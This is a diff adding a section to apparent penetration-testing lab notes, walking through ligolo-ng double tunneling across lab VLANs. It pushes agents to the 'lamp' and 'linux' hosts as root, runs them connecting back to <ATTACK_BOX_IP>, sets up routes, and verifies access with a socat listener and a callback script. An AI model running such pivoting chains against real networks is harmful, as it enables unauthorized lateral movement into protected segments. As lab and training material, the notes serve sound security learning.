@@ -476,6 +476,99 @@ interface_list
 exit
 ```
 
+### Double tunneling to latest (VLAN 23)
+
+This extends the pivoting chain to reach the `latest` machine on VLAN 23, which is only accessible from the targets on VLAN 22.  This is true double tunneling across two network boundaries.
+
+See also: https://docs.ligolo.ng/sample/double/
+
+```
+kali (VLAN 20) → jumpbox (VLAN 20) → target (VLAN 22) → latest (VLAN 23)
+```
+
+> **Quirk 1** — Ligolo's Autoroute proposes the agent's own subnet, which creates a routing loop.  Manually specify routes instead.
+>
+> **Quirk 2** — `listener_add --to` with an external IP fails silently on a double pivot.  Use `127.0.0.1:11601` as documented in the ligolo docs.
+
+#### First agent (jumpbox → targets)
+
+Reuse the first agent setup from above (agent on lamp, route to 10.X.22.0/24).
+
+```
+[[ Ligolo~Server ]]*
+cd tools/ligolo-ng
+sudo ./proxy -selfcert
+certificate_fingerprint
+interface_create --name ligolo
+```
+
+```
+[[ Ligolo~DoubleClient1 ]]*
+cd tools/ligolo-ng
+scp agent root@lamp:
+ssh root@lamp 'chmod +x agent'
+ssh root@lamp './agent -connect <ATTACK_BOX_IP>:11601 -accept-fingerprint <FINGERPRINT>'
+```
+
+```
+[[ Ligolo~Server ]]
+session
+	#Pick the lamp session
+route_add --name ligolo --route 10.X.22.0/24
+start
+```
+
+#### Push agent to the linux target through the first tunnel
+
+```
+[[ Ligolo~Server ]]
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
+	#Must use 127.0.0.1 — see Quirk 2
+```
+
+```
+[[ Ligolo~DoubleClient2 ]]*
+cd tools/ligolo-ng
+ip route get 10.X.22.50
+	#Verify we reach linux through the ligolo interface
+scp agent root@linux:
+ssh root@linux 'chmod +x agent'
+ssh root@linux './agent -connect lamp:11601 -accept-fingerprint <FINGERPRINT>'
+```
+
+#### Switch to the second agent and route to VLAN 23
+
+```
+[[ Ligolo~Server ]]
+stop
+session
+	#Pick the linux session — do NOT accept autoroute (Quirk 1)
+route_add --name ligolo --route 10.X.23.0/24
+start
+```
+
+#### Verify connectivity to latest
+
+```
+[[ Ligolo~DoubleCallMe ]]*
+lsof -i udp:4444
+	socat -u udp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
+cat /tmp/PROOF
+callMe.sh latest 80 <ATTACK_BOX_IP> 4444 udp
+cat /tmp/PROOF
+	#The callback should show that latest (10.X.23.70) made the request
+```
+
+#### Clean up
+
+```
+[[ Ligolo~Server ]]
+interface_list
+interface_delete --name ligolo
+interface_list
+exit
+```
+
 ## gost
 
 
